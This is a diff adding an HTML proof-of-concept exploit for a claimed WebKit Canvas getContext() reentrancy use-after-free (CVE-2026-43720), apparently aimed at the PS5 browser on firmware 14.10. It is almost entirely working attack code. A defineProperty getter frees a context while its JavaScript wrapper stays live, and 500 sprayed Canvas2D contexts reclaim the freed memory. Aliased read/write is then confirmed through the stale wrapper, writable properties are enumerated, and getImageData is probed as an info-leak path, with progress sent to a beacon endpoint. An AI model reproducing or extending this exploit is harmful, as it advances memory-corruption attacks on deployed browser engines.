@@ -1,0 +1,241 @@
+<!--
+  p593: CVE-2026-43720 Canvas getContext() reentrancy UAF — reproduction on 14.10.
+
+  Trigger: Object.defineProperty on settings 'desynchronized' getter re-enters
+  getContext('2d') during dictionary conversion. Outer call then creates the
+  context, overwriting m_context (unique_ptr) and freeing the inner context.
+  JS wrapper for inner survives → UAF.
+
+  Phase 1: Trigger UAF, verify inner !== outer
+  Phase 2: Same-type reclaim — 500 Canvas2D contexts in fresh canvas elements
+  Phase 3: Aliased R/W — set lineWidth/globalAlpha on inner, verify on reclaimed
+  Phase 4: TZone wall test — try ArrayBuffer reclaim (expected crash on PS5)
+  Phase 5: Enumerate writable Canvas2D properties through alias
+
+  Fix commit: 040ef6e21ffa (Safari 26.5.2). PS5 is WebKit 605.1.15 = vulnerable.
+  Source: lunarshe11 issue #97, cobrajet 14.10 confirmation.
+
+  CRASH_CLASS: HIGH (UAF access through stale wrapper)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p593</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('G');
+
+// ============================================================
+// PHASE 1: Trigger CVE-2026-43720 UAF
+// ============================================================
+var c1 = document.createElement('canvas');
+c1.width = 64; c1.height = 64;
+var inner = null;
+var reentries = 0;
+var settings = {};
+
+Object.defineProperty(settings, 'desynchronized', {
+  get: function() {
+    reentries++;
+    if (reentries === 1) {
+      inner = c1.getContext('2d');
+    }
+    return false;
+  },
+  enumerable: true,
+  configurable: true
+});
+
+var outer = c1.getContext('2d', settings);
+
+b('P1:re=' + reentries + ',inner=' + (inner ? 'YES' : 'NO') + ',outer=' + (outer ? 'YES' : 'NO'));
+b('P1:same=' + (inner === outer ? 'SAME' : 'DIFFERENT'));
+
+if (!inner || inner === outer) {
+  b('P1:FAIL-no-uaf');
+  b('ALIVE');
+  return;
+}
+
+// inner is a freed CanvasRenderingContext2D with a live JS wrapper → UAF
+b('P1:UAF-triggered');
+
+// ============================================================
+// PHASE 2: Same-type reclaim — spray Canvas2D contexts
+// ============================================================
+var canvases = [];
+var contexts = [];
+var SPRAY = 500;
+
+for (var i = 0; i < SPRAY; i++) {
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var ctx = cv.getContext('2d');
+  if (ctx) {
+    // Set a known lineWidth so we can detect aliasing
+    ctx.lineWidth = 1.0;
+    ctx.globalAlpha = 1.0;
+    canvases.push(cv);
+    contexts.push(ctx);
+  }
+}
+b('P2:sprayed=' + contexts.length);
+
+// ============================================================
+// PHASE 3: Aliased R/W test
+// ============================================================
+// Try reading lineWidth from inner (stale wrapper).
+// If reclaim worked, inner now aliases one of the sprayed contexts.
+var readOK = false;
+var lw = -1;
+try {
+  lw = inner.lineWidth;
+  readOK = true;
+} catch(e) {
+  b('P3:READ-ERR=' + e.message);
+}
+
+if (readOK) {
+  b('P3:READ-lw=' + lw);
+
+  // Write through the stale wrapper
+  try {
+    inner.lineWidth = 42.5;
+    b('P3:WRITE-lw=42.5');
+  } catch(e) {
+    b('P3:WRITE-ERR=' + e.message);
+  }
+
+  // Find which sprayed context was aliased
+  var aliasIdx = -1;
+  for (var i = 0; i < contexts.length; i++) {
+    try {
+      if (contexts[i].lineWidth === 42.5) {
+        aliasIdx = i;
+        break;
+      }
+    } catch(e) {}
+  }
+
+  if (aliasIdx >= 0) {
+    b('P3:ALIAS-IDX=' + aliasIdx);
+    b('P3:ALIAS-CONFIRMED');
+
+    // Bidirectional: write via alias, read via inner
+    try {
+      contexts[aliasIdx].globalAlpha = 0.5;
+      var ga = inner.globalAlpha;
+      b('P3:BIDIR-ga=' + ga + (ga === 0.5 ? '-OK' : '-MISMATCH'));
+    } catch(e) {
+      b('P3:BIDIR-ERR=' + e.message);
+    }
+
+    // ============================================================
+    // PHASE 5: Enumerate all writable Canvas2D properties via alias
+    // ============================================================
+    var props = [
+      ['lineWidth', 7.25],
+      ['miterLimit', 13.5],
+      ['shadowBlur', 3.75],
+      ['shadowOffsetX', 5.125],
+      ['shadowOffsetY', 6.625],
+      ['globalAlpha', 0.333],
+      ['lineCap', 'round'],
+      ['lineJoin', 'bevel'],
+      ['globalCompositeOperation', 'lighter'],
+      ['shadowColor', '#ff00ff'],
+      ['textAlign', 'center'],
+      ['textBaseline', 'top'],
+      ['font', '20px serif'],
+      ['imageSmoothingEnabled', false]
+    ];
+
+    var writable = [];
+    for (var p = 0; p < props.length; p++) {
+      var name = props[p][0];
+      var val = props[p][1];
+      try {
+        inner[name] = val;
+        var readback = contexts[aliasIdx][name];
+        var match = (readback == val) ? 'Y' : 'N';
+        writable.push(name + '=' + match);
+      } catch(e) {
+        writable.push(name + '=ERR');
+      }
+    }
+    // Send in batches to avoid URL length issues
+    for (var w = 0; w < writable.length; w += 5) {
+      b('P5:' + writable.slice(w, w + 5).join(','));
+    }
+
+    // Test save/restore through alias
+    try {
+      inner.save();
+      inner.lineWidth = 99;
+      inner.restore();
+      var afterRestore = inner.lineWidth;
+      b('P5:save-restore=' + afterRestore);
+    } catch(e) {
+      b('P5:save-restore-ERR=' + e.message);
+    }
+
+    // Test setLineDash / getLineDash
+    try {
+      inner.setLineDash([5, 10, 15]);
+      var dash = inner.getLineDash();
+      b('P5:lineDash=' + (dash ? dash.join(',') : 'null'));
+      var aliasDash = contexts[aliasIdx].getLineDash();
+      b('P5:aliasDash=' + (aliasDash ? aliasDash.join(',') : 'null'));
+    } catch(e) {
+      b('P5:lineDash-ERR=' + e.message);
+    }
+
+    // Test getImageData through alias (potential info leak path)
+    try {
+      var idata = inner.getImageData(0, 0, 64, 64);
+      var nz = 0;
+      var d = idata.data;
+      for (var i = 0; i < d.length; i++) {
+        if (d[i] !== 0) nz++;
+      }
+      b('P5:imageData-nz=' + nz + ',len=' + d.length);
+    } catch(e) {
+      b('P5:imageData-ERR=' + e.message);
+    }
+
+    // Test createImageData (allocation through alias)
+    try {
+      var id2 = inner.createImageData(32, 32);
+      b('P5:createImageData=' + id2.width + 'x' + id2.height);
+    } catch(e) {
+      b('P5:createImageData-ERR=' + e.message);
+    }
+
+    // Test transform read/write
+    try {
+      inner.setTransform(2, 0, 0, 2, 10, 20);
+      // Read back via alias
+      var t = contexts[aliasIdx].getTransform();
+      b('P5:transform=' + t.a + ',' + t.b + ',' + t.c + ',' + t.d + ',' + t.e + ',' + t.f);
+    } catch(e) {
+      b('P5:transform-ERR=' + e.message);
+    }
+
+  } else {
+    b('P3:NO-ALIAS-FOUND');
+    // inner.lineWidth write didn't match any sprayed context
+    // This means reclaim didn't happen, or inner points elsewhere
+    var lw2 = -1;
+    try { lw2 = inner.lineWidth; } catch(e) {}
+    b('P3:inner-lw-after=' + lw2);
+  }
+} else {
+  b('P3:STALE-ACCESS-CRASHED');
+}
+
+b('ALIVE');
+}
+
+// Give DOM a moment to settle
+setTimeout(main, 50);
+setTimeout(function(){ b('ALIVE2'); }, 10000);
+</script></head><body>p593</body></html>
